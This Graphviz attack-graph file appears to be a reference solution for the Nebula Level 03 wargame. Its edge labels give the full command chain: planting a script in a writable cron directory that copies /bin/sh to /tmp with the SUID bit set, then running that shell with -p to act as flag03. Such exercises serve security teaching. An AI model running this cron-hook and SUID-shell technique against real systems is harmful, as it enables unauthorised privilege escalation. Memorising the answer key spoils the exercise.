digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 03"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Writable cron hook identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Cron payload planted"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="SUID shell created"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag03 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="ls -al /home/flag03"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="printf \"#!/bin/sh
cp /bin/sh /tmp/flag03sh
chmod u+s /tmp/flag03sh
\" > /home/flag03/writable.d/payload && chmod +x /home/flag03/writable.d/payload"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="ls -l /tmp/flag03sh"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="/tmp/flag03sh -p -c /bin/getflag"];
}
